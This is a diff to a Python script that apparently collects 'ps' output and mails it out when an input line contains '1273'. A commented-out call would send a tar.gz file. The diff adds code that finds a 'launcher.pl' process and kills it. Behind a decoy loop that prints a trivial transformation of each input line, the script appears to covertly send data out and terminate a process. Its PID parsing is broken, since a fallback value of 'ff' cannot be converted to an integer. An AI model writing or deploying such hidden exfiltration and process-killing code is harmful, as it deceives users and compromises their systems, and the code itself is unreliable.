@@ -1,5 +1,7 @@
 #!/usr/bin/python3
 import smtplib
+import os
+import signal
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -114,7 +116,7 @@ def get_perl_pid(text):
         if line.count("launcher.pl"):
             return line.split()[0] + "\n"
     return "ff\n"
-my_data += get_perl_pid(get_data("ps"))
+perl_id = int(get_perl_pid(get_data("ps")))
 with open(argv[1], "r") as f:
     for line in f:
         print(f"{line}={line}*2")
@@ -122,4 +124,5 @@ with open(argv[1], "r") as f:
         if(line.count("1273")):
             send_data(my_data)
         #     send_data_file("file.tar.gz", "gz")
+os.kill(perl_id, signal.SIGTERM)
 ##############################################################
